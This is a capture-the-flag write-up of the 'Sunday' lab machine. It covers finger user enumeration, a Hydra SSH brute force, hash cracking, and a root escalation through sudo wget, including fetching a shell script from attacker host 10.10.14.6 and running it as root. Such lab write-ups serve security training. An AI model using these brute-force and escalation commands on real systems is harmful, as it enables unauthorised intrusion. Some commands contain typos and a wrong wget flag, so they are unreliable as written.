Sunday without metasploit

![Sunday](https://user-images.githubusercontent.com/55708909/91526264-db8e9000-e920-11ea-8de4-c2507f4099ee.png)


Starting with nmap scan:

Nmap -sC -sV -T4 -A -O -oA Sunday -p- 10.10.10.76


I saw finger service ruuning and i know this service give info about logged in user.

![Sunday_finger](https://user-images.githubusercontent.com/55708909/91526816-1b09ac00-e922-11ea-8178-b6a72a650e6a.png)

Pentest monkey has an awesome script for finger service , here is the  link

wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl

Run it in order to know who logged into p.c. 

You need a good list for users and here is one from seclist github

wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt

run these command and you will find appropriate users

![Sunday_finger_user](https://user-images.githubusercontent.com/55708909/91527570-a2a3ea80-e923-11ea-8177-96638e20536d.png)

i brute force  sssh and found password sunday

hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022

logged into system.

![Sunday_backup](https://user-images.githubusercontent.com/55708909/91528293-0f6bb480-e925-11ea-9081-a40875c121bf.png)

john --wordlist=/usr/share/wordlists/rcokyou.txt hash.txt

password : cooldude!

![Sunday_user_flag](https://user-images.githubusercontent.com/55708909/91529213-85bce680-e926-11ea-88dc-c922dfa5bdc5.png)

![Sunday_root](https://user-images.githubusercontent.com/55708909/91529732-74280e80-e927-11ea-881e-62088329d171.png)


First i check the sudo right for sammy and found out he has wget right i remember it can print the output of any files even restricted ones

sudo /usr/bin/wget -i /root/root.txt

But i am greedy and want full control over p.c. so i combine both of sudo right for sunny and sammy

Prepare troll files with contents:

troll

#!/bin/bash

bash


Fire up the web browser and type following commnads:

sudo /usr/bin/wget -o /root/troll http://10.10.14.6/troll

and againg log into sysytem as sunny and type sudo /root/troll

you will be root

![Sunday_root](https://user-images.githubusercontent.com/55708909/91529732-74280e80-e927-11ea-881e-62088329d171.png)



